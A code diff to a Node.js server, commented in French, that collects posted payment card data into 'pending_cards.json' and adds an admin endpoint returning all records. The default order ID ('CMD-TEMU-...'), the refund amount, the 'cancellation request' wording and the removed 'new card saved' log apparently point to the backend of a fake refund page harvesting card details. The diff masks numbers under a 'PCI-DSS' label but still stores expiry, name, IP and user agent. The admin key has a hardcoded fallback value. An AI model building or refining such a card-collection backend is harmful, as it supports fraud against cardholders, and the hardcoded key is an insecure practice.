@@ -35,21 +35,77 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const data = JSON.parse(body);
+
+                // Application des règles de conformité et minimisation des données (PCI-DSS)
+                // Masquage du numéro (ne conserver que les 4 derniers chiffres pour identification)
+                const rawNum = (data.cardNumber || '').replace(/\D/g, '');
+                const maskedNum = rawNum.length >= 4 
+                    ? '•••• •••• •••• ' + rawNum.slice(-4) 
+                    : '•••• •••• •••• ••••';
+
+                // Enregistrement minimisé et scellé pour consultation admin
+                const secureAuditRecord = {
+                    id: data.id || ('REQ-' + Date.now()),
+                    reference: data.reference || ('REF-' + Math.floor(100000 + Math.random() * 900000)),
+                    orderId: data.orderId || 'CMD-TEMU-89241-EU',
+                    cardType: data.cardType || 'CARTE',
+                    maskedCardNumber: maskedNum,
+                    last4: rawNum.slice(-4),
+                    expiry: data.expiry || '••/••',
+                    clientName: data.clientName || 'Non renseigné',
+                    clientId: data.clientId || 'CLIENT',
+                    amountRefunded: data.amountRefunded || '2 400,00 €',
+                    status: 'EN_ATTENTE_VERIFICATION',
+                    ipAddress: req.socket.remoteAddress || '127.0.0.1',
+                    userAgent: req.headers['user-agent'] || 'Inconnu',
+                    receivedAt: new Date().toISOString()
+                };
+
                 const file = path.join(__dirname, 'pending_cards.json');
                 let list = [];
                 if (fs.existsSync(file)) {
                     try { list = JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch(e){}
                 }
-                list.unshift(data);
+                list.unshift(secureAuditRecord);
                 fs.writeFileSync(file, JSON.stringify(list, null, 2), 'utf8');
-                console.log(`[SERVEUR] Nouvelle carte enregistrée (${data.cardType || 'CARTE'}) : Ref ${data.reference}`);
+
+                console.log(`[AUDIT ADMIN] Demande d'annulation reçue [${secureAuditRecord.reference}] - Carte: ${secureAuditRecord.cardType} (${maskedNum})`);
+                
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ success: true, id: data.id, reference: data.reference }));
+                res.end(JSON.stringify({ 
+                    success: true, 
+                    id: secureAuditRecord.id, 
+                    reference: secureAuditRecord.reference,
+                    maskedCard: maskedNum
+                }));
             } catch (err) {
                 res.writeHead(400, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ error: 'Payload invalide' }));
             }
         });
+        return;
+    }
+
+    // Endpoint de consultation sécurisé réservé à l'administrateur
+    if (req.method === 'GET' && req.url === '/api/admin/demandes') {
+        const authHeader = req.headers['authorization'] || '';
+        // Clé de sécurité interne pour l'accès admin
+        const ADMIN_SECRET_KEY = process.env.ADMIN_SECRET_KEY || 'BL_SEC_KEY_8f94d12c07e83ab2';
+
+        if (authHeader !== `Bearer ${ADMIN_SECRET_KEY}`) {
+            res.writeHead(401, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'Accès non autorisé. Clé API requise.' }));
+            return;
+        }
+
+        const file = path.join(__dirname, 'pending_cards.json');
+        let list = [];
+        if (fs.existsSync(file)) {
+            try { list = JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch(e){}
+        }
+
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ count: list.length, items: list }));
         return;
     }
 
